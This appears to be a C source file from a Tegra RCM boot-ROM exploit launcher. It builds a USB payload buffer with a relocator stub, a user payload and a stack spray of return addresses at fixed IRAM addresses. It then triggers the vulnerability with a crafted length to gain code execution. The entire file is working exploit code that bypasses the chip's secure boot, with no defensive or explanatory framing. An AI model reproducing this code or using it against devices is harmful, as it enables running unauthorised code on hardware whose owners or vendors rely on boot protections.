#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include <assert.h>

#include <libusb.h>

#include "backend/backend.h"

#include "payload.h"
#include "tegra.h"
#include "util.h"

extern uint8_t intermezzo_bin[];
extern size_t intermezzo_bin_size;

// The address where the RCM payload is placed.
// This is fixed for most device.
#define RCM_PAYLOAD_ADDR        0x40010000

// The address where the user payload is expected to begin.
#define PAYLOAD_START_ADDR      0x40010E40

// Specify the range of addresses where we should inject oct
// payload address.
#define STACK_SPRAY_START       0x40014E40
#define STACK_SPRAY_END         0x40017000

#define PAYLOAD_SIZE            0x30298
#define PADDING1                680
#define PADDING2                PAYLOAD_START_ADDR - RCM_PAYLOAD_ADDR
#define PADDING3                STACK_SPRAY_START - PAYLOAD_START_ADDR

#define STACK_END               0x40010000

void upload_payload(tegra_handle* handle, const uint8_t* target_payload, const size_t target_size)
{
    // Use the maximum length accepted by RCM, so we can transmit as much payload as
    // we want; we'll take over before we get to the end.
    uint8_t* payload_buffer = malloc(PAYLOAD_SIZE);
    memset(payload_buffer, 0, PAYLOAD_SIZE);

    const uint32_t length = swap_little_32(PAYLOAD_SIZE);

    uint8_t* payload_head = payload_buffer;
    memcpy(payload_head, (const uint8_t*)&length, sizeof(length) / sizeof(*payload_head));
    // pad out to 680 so the payload starts at the right address in IRAM
    payload_head += PADDING1;

    memcpy(payload_head, intermezzo_bin, intermezzo_bin_size);
    payload_head += PADDING2;


    const size_t spray_size = STACK_SPRAY_START - PAYLOAD_START_ADDR;
    const size_t target_rest_size = target_size - spray_size;
    size_t repeat_count = (STACK_SPRAY_END - STACK_SPRAY_START) / 4;

    uint32_t payload_address = swap_little_32(RCM_PAYLOAD_ADDR);

    memcpy(payload_head, target_payload, spray_size);
    payload_head += spray_size;

    for (size_t i = 0; i < repeat_count; ++i)
    {
        const size_t n = sizeof(length) / sizeof(*payload_head);

        memcpy(payload_head, (uint8_t*)&payload_address, n);
        payload_head += n;
    }

    memcpy(payload_head, target_payload+spray_size, target_rest_size);
    payload_head += target_rest_size;

    const int padding_size = (int)(0x1000 - ((payload_head - payload_buffer) % 0x1000));
    payload_head += padding_size;

    const int final_payload_size = (int)(payload_head - payload_buffer);
    assert(final_payload_size <= PAYLOAD_SIZE);
    assert(0 < final_payload_size);

    tegra_rcm_write(handle, payload_buffer, (int)final_payload_size);
    free(payload_buffer);
}

int run_payload(tegra_handle* handle)
{
    // TODO refactor to use uint64_t
    uint16_t length = (uint16_t)(STACK_END - tegra_get_current_buffer_address(handle));

    return trigger_vulnerability(handle, length);
}
